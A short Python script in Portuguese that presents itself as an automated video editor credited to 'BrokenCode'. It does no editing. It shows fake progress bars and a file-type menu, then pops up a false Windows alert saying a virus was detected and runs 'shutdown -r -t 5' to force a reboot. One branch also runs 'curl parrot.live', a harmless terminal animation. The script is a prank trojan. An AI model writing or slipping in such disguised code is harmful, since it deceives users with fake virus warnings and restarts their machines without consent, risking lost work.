import os
import time
def linha():
    print('--=--'*20)
linha()
print('     Editor de Videos automatizado')
print(' --=--=--CREATED BY BROKENCODE--=--=--')
print(' CANAL NO YOUTUBE: https://www.youtube.com/channel/UCFDczNXoCzed9gFipynGToA')
linha()
res = input('Deseja Começar o processo?[s/n]  ')
n = 'n'
i = 10
if res == n :
    for i in range(5):
        m = i * 20
        print(f'{m}%')
        time.sleep(1)
        os.system('cls')
    os.system(' curl parrot.live')
print('CARREGANDO NOSSO SISTEMA...')
time.sleep(1.5)
print('Tipo de arquivo que deseja importar! ')
print('JPEG --> Digite 1')
print('MP4 --> Digite 2')
input('')
print('Carregando sistema...')
i = 10
for i in range(5):
    m = i * 20
    print(f'{m}%')
    time.sleep(1)
    os.system('cls')
    
    
time.sleep(3)
os.system('cls')
def msg():
    msg= 'Viruz detectado! Sistema altamente em risco!!'
    os.system(f'msg * {msg}')
    time.sleep(2)
def reiniciar():
    os.system('shutdown -r -t 5')
msg()
reiniciar()
